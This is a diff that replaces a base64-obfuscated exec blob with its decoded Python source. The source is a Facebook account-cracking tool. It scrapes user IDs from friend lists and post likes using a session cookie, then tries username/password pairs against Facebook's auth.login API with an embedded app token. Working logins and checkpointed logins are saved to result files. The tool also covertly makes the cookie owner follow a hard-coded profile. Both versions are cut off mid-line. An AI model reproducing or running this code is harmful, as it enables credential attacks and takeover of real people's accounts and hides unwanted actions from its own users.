@@ -1,4 +1,120 @@
-#encode by aryhas
-#mumet dol
-import base64
-exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCiMgY29kZWQgYnkgYXJ5aGFzDQppbXBvcnQgb3MNCmltcG9ydCByZSANCmltcG9ydCB0aW1lDQppbXBvcnQganNvbg0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHJlcXVlc3RzDQpmcm9tIGxpYiBpbXBvcnQgbG9nbw0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgcGFyc2VyDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQptYmFzaWMgPSAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29te30nDQpnbG9iYWwgZGllLGNoZWNrLHJlc3VsdCwgY291bnQNCg0KaWQgPSBbXQ0KZGllID0gMA0KY2hlayA9IFtdDQpsaWZlID0gW10NCmNvdW50ID0gMA0KY2hlY2sgPSAwDQpyZXN1bHQgPSAwDQoNCmcgPSAnXHgxYlsxOzMybScNCncgPSAnXHgxYlsxOzM3bScNCmIgPSAnXHgxYlsxOzM2bScNCnIgPSAnXHgxYlsxOzMxbScNCg0KZGVmIG1hc3VrKCk6DQogICAgICAgIGxvZ28uYmFubmVyKCkNCiAgICAgICAgcHJpbnQoJ1xuXG5cdFx04om6IFwwMzNbMTszNm1GQUNFQk9PSyBMT0dJTlwwMzNbMG0g4om7XG5cbicpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCJjb29raWVzIikucmVhZCgpDQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgICAgICAgICBjZWsgPSBpbnB1dCgiW1wwMzNbMTszMm0+XDAzM1swbSBFbnRlciBDb29raWUgOiAiKQ0KICAgICAgICBjZWsgPSB7ImNvb2tpZSI6Y2VrfQ0KICAgICAgICBpc21pID0gc2VzLmdldChtYmFzaWMuZm9ybWF0KCIvbWUiLHZlcmlmeT1GYWxzZSksY29va2llcz1jZWspLmNvbnRlbnQNCiAgICAgICAgaWYgIm1iYXNpY19sb2dvdXRfYnV0dG9uIiBpbiBzdHIoaXNtaSk6DQogICAgICAgICAgICAgICAgaWYgIkFwYSB5YW5nIEFuZGEgcGlraXJrYW4gc2VrYXJhbmciIGluIHN0cihpc21pKToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigiY29va2llcyIsInciKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGNla1siY29va2llIl0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIjIENoYW5nZSB0aGUgbGFuZ3VhZ2UsIHBsZWFzZSB3YWl0ISEiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0cy5nZXQobWJhc2ljLmZvcm1hdChwYXJzZXIoaXNtaSwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkJhaGFzYSBJbmRvbmVzaWEiKVsiaHJlZiJdKSxjb29raWVzPWNlaykNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICMgcGxlYXNlIGRvbid0IHJlbW92ZSB0aGlzIG9yIGNoYW5nZQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWt1dGkgPSBwYXJzZXIocmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQoIi9hbmJpYS5zYW5zIiksY29va2llcz1jZWspLmNvbnRlbnQsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJJa3V0aSIpWyJocmVmIl0NCiAgICAgICAgICAgICAgICAgICAgICAgIHNlcy5nZXQobWJhc2ljLmZvcm1hdChpa3V0aSksY29va2llcz1jZWspDQogICAgICAgICAgICAgICAgZXhjZXB0IDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MgDQogICAgICAgICAgICAgICAgcmV0dXJuIGNla1siY29va2llIl0NCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgZXhpdCgiIyBjb29raWVzIGludmFsaWQiKQ0KZGVmIGxvZ2luKHVzZXJuYW1lLHBhc3N3b3JkLGNlaz1GYWxzZSk6DQogICAgICAgIGdsb2JhbCBkaWUsY2hlY2sscmVzdWx0LGNvdW50DQogICAgICAgIGIgPSAiMzUwNjg1NTMxNzI4JTdDNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzIiDQogICAgICAgIHBhcmFtcyA9IHsNCiAgICAgICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogYiwNCiAgICAgICAgICAgICAgICAnZm9ybWF0JzogJ0pTT04nLA0KICAgICAgICAgICAgICAgICdzZGtfdmVyc2lvbic6ICcyJywNCiAgICAgICAgICAgICAgICAnZW1haWwnOiB1c2VybmFtZSwNCiAgICAgICAgICAgICAgICAnbG9jYWxlJzogJ2VuX1VTJywNCiAgICAgICAgICAgICAgICAncGFzc3dvcmQnOiBwYXNzd29yZCwNCiAgICAgICAgICAgICAgICAnc2RrJzogJ2lvcycsDQogICAgICAgICAgICAgICAgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywNCiAgICAgICAgICAgICAgICAnc2lnJzogJzNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JywNCiAgICAgICAgfQ0KICAgICAgICBhcGkgPSAnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4nDQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGFwaSwgcGFyYW1zPXBhcmFtcykNCiAgICAgICAgaWYgJ0VBQScgaW4gcmVzcG9uc2UudGV4dDoNCiAgICAgICAgICAgICAgICBwcmludChmIlxyW1wwMzNbMTszMm1MSUZFXDAzM1swbV0ge3VzZXJuYW1lfSA9PiB7cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikNCiAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgcmVzdWx0ICs9IDENCiAgICAgICAgICAgICAgICBpZiBjZWs6DQogICAgICAgICAgICAgICAgICAgICAgICBsaWZlLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1saWZlLnR4dCcsJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHVzZXJuYW1lICsgJ3wnICsgcGFzc3dvcmQgKyAnXG4nKQ0KICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5qc29uKClbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgIHByaW50KGYiXHJbXDAzM1sxOzkxbUNIRUtcMDMzWzBtXSB7dXNlcm5hbWV9ID0+IHtwYXNzd29yZH0gICAgICAgICAgICAgICAgICAgICIsZW5kPSIiKQ0KICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICBjaGVjayArPSAxDQogICAgICAgICAgICAgICAgaWYgY2VrOg0KICAgICAgICAgICAgICAgICAgICAgICAgY2hlay5hcHBlbmQodXNlcm5hbWUrInwiK3Bhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtY2hlY2sudHh0JywnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgZGllICs9IDENCiAgICAgICAgZm9yIGkgaW4gbGlzdCgnXHwvLeKAoicpOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcclt7aX1dIExpZmUgOiAoe3N0cihyZXN1bHQpfSkgY2hlY2twb2ludCA6ICh7c3RyKGNoZWNrKX0pIGRpZSA6ICh7c3RyKGRpZSl9KSIsZW5kPSIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjIpDQpkZWYgZ2V0aWQodXJsKToNCiAgICAgICAgcmF3ID0gcmVxdWVzdHMuZ2V0KHVybCxjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgZ2V0dXNlciA9IHJlLmZpbmRhbGwoJ21pZGRsZSI+PGEgY2xhc3M9Ii4uIiBocmVmPSIoLio/KSI+KC4qPyk8L2E+JyxzdHIocmF3KSkNCiAgICAgICAgZm9yIHggaW4gZ2V0dXNlcjoNCiAgICAgICAgICAgICAgICBpZiAncHJvZmlsZScgaW4geFswXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh4WzFdICsgJ3wnICsgcmUuZmluZGFsbCgiPShcZCopPyIsc3RyKHhbMF0pKVswXSkNCiAgICAgICAgICAgICAgICBlbGlmICdmcmllbmRzJyBpbiB4Og0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHhbMV0gKyAnfCcgKyB4WzBdLnNwbGl0KCcvJylbMV0uc3BsaXQoJz8nKVswXSkNCiAgICAgICAgICAgICAgICBwcmludCgnXHIjICcgKyBzdHIobGVuKGlkKSkgKyAiIHJldHJpZXZlZCIsZW5kPSIiKQ0KICAgICAgICBpZiAnTGloYXQgVGVtYW4gTGFpbicgaW4gc3RyKHJhdyk6DQogICAgICAgICAgICAgICAgZ2V0aWQobWJhc2ljLmZvcm1hdChwYXJzZXIocmF3LCdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLHN0cmluZz0nTGloYXQgVGVtYW4gTGFpbicpWydocmVmJ10pKQ0KICAgICAgICByZXR1cm4gaWQNCmRlZiBmcm9tbGlrZXModXJsKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGxpa2UgPSByZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICAgICAgICAgIGxvdmUgPSByZS5maW5kYWxsKCdocmVmPSIoL3VmaS4qPykiJyxzdHIobGlrZSkpWzBdDQogICAgICAgICAgICAgICAgYXdzID0gZ2V0bGlrZShtYmFzaWMuZm9ybWF0KGxvdmUpKQ0KICAgICAgICAgICAgICAgIHJldHVybiBhd3MNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGV4aXQoIiMgY2FudCBkdW1wIGlkICIpDQpkZWYgZ2V0bGlrZShyZWFjdCk6DQogICAgICAgIGxpa2UgPSByZXF1ZXN0cy5nZXQocmVhY3QsY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgIGlkcyAgPSByZS5maW5kYWxsKCdjbGFzcz0iYi4iPjxhIGhyZWY9IiguKj8pIj4oLio='))
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# coded by aryhas
+import os
+import re 
+import time
+import json
+import random
+import requests
+from lib import logo
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor
+mbasic = 'https://mbasic.facebook.com{}'
+global die,check,result, count
+
+id = []
+die = 0
+chek = []
+life = []
+count = 0
+check = 0
+result = 0
+
+g = '\x1b[1;32m'
+w = '\x1b[1;37m'
+b = '\x1b[1;36m'
+r = '\x1b[1;31m'
+
+def masuk():
+        logo.banner()
+        print('\n\n\t\t≺ \033[1;36mFACEBOOK LOGIN\033[0m ≻\n\n')
+        try:
+                cek = open("cookies").read()
+        except FileNotFoundError:
+                cek = input("[\033[1;32m>\033[0m Enter Cookie : ")
+        cek = {"cookie":cek}
+        ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
+        if "mbasic_logout_button" in str(ismi):
+                if "Apa yang Anda pikirkan sekarang" in str(ismi):
+                        with open("cookies","w") as f:
+                                f.write(cek["cookie"])
+                else:
+                        print("# Change the language, please wait!!")
+                        try:
+                                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                        except:
+                                pass
+                try:
+                        # please don't remove this or change
+                        ikuti = parser(requests.get(mbasic.format("/dogukan.er.144"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                        ses.get(mbasic.format(ikuti),cookies=cek)
+                except :
+                        pass 
+                return cek["cookie"]
+        else:
+                 exit("# cookies invalid")
+def login(username,password,cek=False):
+        global die,check,result,count
+        b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
+        params = {
+                'access_token': b,
+                'format': 'JSON',
+                'sdk_version': '2',
+                'email': username,
+                'locale': 'en_US',
+                'password': password,
+                'sdk': 'ios',
+                'generate_session_cookies': '1',
+                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+        }
+        api = 'https://b-api.facebook.com/method/auth.login'
+        response = requests.get(api, params=params)
+        if 'EAA' in response.text:
+                print(f"\r[\033[1;32mLIFE\033[0m] {username} => {password}                       ",end="")
+                print()
+                result += 1
+                if cek:
+                        life.append(username+"|"+password)
+                else:
+                        with open('results-life.txt','a') as f:
+                                f.write(username + '|' + password + '\n')
+        elif 'www.facebook.com' in response.json()['error_msg']:
+                print(f"\r[\033[1;91mCHEK\033[0m] {username} => {password}                    ",end="")
+                print()
+                check += 1
+                if cek:
+                        chek.append(username+"|"+password)
+                else:
+                        with open('results-check.txt','a') as f:
+                                f.write(username + '|' + password + '\n')
+        else:
+                die += 1
+        for i in list('\|/-•'):
+                        print(f"\r[{i}] Life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
+                        time.sleep(0.2)
+def getid(url):
+        raw = requests.get(url,cookies=kuki).content
+        getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
+        for x in getuser:
+                if 'profile' in x[0]:
+                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
+                elif 'friends' in x:
+                        continue
+                else:
+                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
+                print('\r# ' + str(len(id)) + " retrieved",end="")
+        if 'Lihat Teman Lain' in str(raw):
+                getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
+        return id
+def fromlikes(url):
+        try:
+                like = requests.get(url,cookies=kuki).content
+                love = re.findall('href="(/ufi.*?)"',str(like))[0]
+                aws = getlike(mbasic.format(love))
+                return aws
+        except:
+                exit("# cant dump id ")
+def getlike(react):
+        like = requests.get(react,cookies=kuki).content
+        ids  = re.findall('class="b."><a href="(.*?)">(.*
